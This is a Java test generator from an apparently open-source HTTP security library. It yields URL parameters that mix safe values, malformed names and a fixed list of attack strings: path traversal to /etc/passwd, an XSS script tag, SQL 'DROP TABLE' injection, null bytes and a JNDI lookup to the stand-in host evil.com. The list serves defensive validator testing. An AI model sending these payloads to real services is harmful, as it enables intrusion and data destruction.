/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;

/**
 * Generates URLParameter records for testing purposes.
 * Implements: Task G7 from HTTP verification specification
 */
public class URLParameterGenerator implements TypedGenerator<URLParameter> {

    private static final TypedGenerator<String> PARAMETER_NAMES = Generators.fixedValues(
            "page",
            "size",
            "sort",
            "filter",
            "search",
            "category",
            "id",
            "type",
            "status",
            "limit",
            "offset",
            "format",
            "lang",
            "version",
            "timestamp"
    );

    private static final TypedGenerator<String> SAFE_VALUES = Generators.fixedValues(
            "1",
            "10",
            "100",
            "true",
            "false",
            "asc",
            "desc",
            "json",
            "xml",
            "en",
            "de",
            "fr",
            "active",
            "inactive",
            "test",
            "example"
    );

    private static final TypedGenerator<String> ATTACK_VALUES = Generators.fixedValues(
            "../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "%00",
            "\u0000",
            "A".repeat(1000),
            "../../../root",
            "${jndi:ldap://evil.com/}",
            "javascript:alert(1)",
            "file:///etc/passwd"
    );

    private static final TypedGenerator<String> SPECIAL_NAMES = Generators.fixedValues(
            "",                          // Empty name
            "   ",                      // Whitespace name
            "param with spaces",        // Spaces in name
            "param%20encoded",          // Encoded name
            "param[bracket]",           // Brackets in name
            "param{brace}",             // Braces in name
            "param|pipe",               // Pipe in name
            "param=equals",             // Equals in name
            "param&ampersand",          // Ampersand in name
            "param#hash",               // Hash in name
            "param?question",           // Question mark in name
            "param/slash",              // Slash in name
            "param\\backslash",         // Backslash in name
            "very_long_parameter_" + "name".repeat(100) // Very long name
    );

    private final TypedGenerator<Integer> typeGen = Generators.integers(0, 3);

    @Override
    public URLParameter next() {
        int type = typeGen.next();

        return switch (type) {
            case 0 -> new URLParameter(PARAMETER_NAMES.next(), SAFE_VALUES.next());
            case 1 -> new URLParameter(PARAMETER_NAMES.next(), ATTACK_VALUES.next());
            case 2 -> new URLParameter(SPECIAL_NAMES.next(), SAFE_VALUES.next());
            default -> new URLParameter(SPECIAL_NAMES.next(), ATTACK_VALUES.next());
        };
    }

    @Override
    public Class<URLParameter> getType() {
        return URLParameter.class;
    }
}